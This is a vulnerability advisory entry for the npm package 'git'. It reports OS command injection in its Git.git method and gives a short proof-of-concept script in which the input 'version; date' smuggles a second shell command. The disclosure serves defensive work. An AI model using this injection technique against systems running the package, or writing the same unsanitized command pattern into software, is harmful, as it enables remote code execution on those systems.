package_slug: "npm/git"
title: "Improper Neutralization of Special Elements used in an OS Command ('OS Command
  Injection')"
description: "All versions of package git is vulnerable to Remote Code Execution (RCE)
  due to missing sanitization in the Git.git method, which allows execution of OS
  commands rather than just git commands. Steps to Reproduce 1. Create a file named
  exploit.js with the following content: js var Git = require(\"git\").Git; var repo
  = new Git(\"repo-test\"); var user_input = \"version; date\"; repo.git(user_input,
  function(err, result) { console.log(result); }) 2. In the same directory as exploit.js,
  run npm install git. 3. Run exploit.js: node exploit.js. You should see the outputs
  of both the git version and date command-lines. Note that the repo-test Git repository
  does not need to be present to make this PoC work."
